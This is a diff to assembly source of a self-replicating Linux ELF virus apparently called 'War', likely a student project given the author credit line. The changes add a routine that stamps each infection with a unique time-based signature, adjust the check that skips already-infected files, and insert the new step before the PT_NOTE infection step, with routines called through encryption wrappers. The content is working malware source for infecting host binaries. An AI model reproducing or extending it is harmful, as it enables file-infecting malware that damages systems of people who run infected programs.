@@ -178,6 +178,46 @@ section .text
         ret
     __F_mmap__end:
 
+    __F_set_unique_trace:
+        push rax
+        push rbx
+        push rcx
+        push rdx
+        push rdi
+        push rsi
+        mov rax, SC_GETTIME
+        mov rdi, 0
+        lea rsi, VAR(War.ts)
+        syscall
+        mov rax, VAR(War.ts)
+        mov rdi, 0x1e9
+        mul rdi
+        xor rcx, rcx
+        lea rdi, [rel Traza + 47]
+        .convert:
+            xor rdx, rdx        ; limpiar rdx
+            mov rbx, 10
+            div rbx             ; rax = rax / 10
+                                ; rdx = resto
+            add dl, '0'         ; convertir a ASCII
+           push rdx            ; guardar dígito en stack
+            inc rcx
+            test rax, rax
+            jnz .convert
+        .write_loop:
+            pop rax
+            mov [rdi], al
+            inc rdi
+            loop .write_loop            
+
+        pop rsi
+        pop rdi
+        pop rdx
+        pop rcx
+        pop rbx
+        pop rax
+        ret
+    __F_set_unique_trace__end:
 ; ----------------------------------------------------------------------------------------------------------------------
 
     _init:
@@ -513,7 +553,7 @@ section .text
         add rsi, rbx
         sub rsi, rcx
         lea rdi, Traza
-        mov rcx, 46
+        mov rcx, Traza_len
         cld                 ; incremental
         rep cmpsb           ; comparar rdi y rsi rcx bytes
         je .munmap
@@ -573,6 +613,9 @@ section .text
     .ftruncate:
         CALL_ENCRYPT(ftruncate)
         jnz .munmap
+        
+    .unique_trace:
+        CALL_ENCRYPT(set_unique_trace)
 
     .mod_pt_note:
         CALL_ENCRYPT(mod_pt_note)
@@ -665,8 +708,8 @@ section .text
     __F_data__end:
     Traza_position  equ     _finish - Traza
     fix_char        db      0
-    Traza           db      "War version 1.0 (c)oded by tomartin & carce-bo",0  ;46
-    Traza_len       equ     $ - Traza - 1
+    Traza           db      "War version 1.0 (c)oded by tomartin & carce-bo 000000000001",0  ;46
+    Traza_len       equ     $ - Traza - 1 - 12 - 1
     host_entrypoint dq      _dummy_host_entrypoint
     virus_vaddr     dq      _start
 
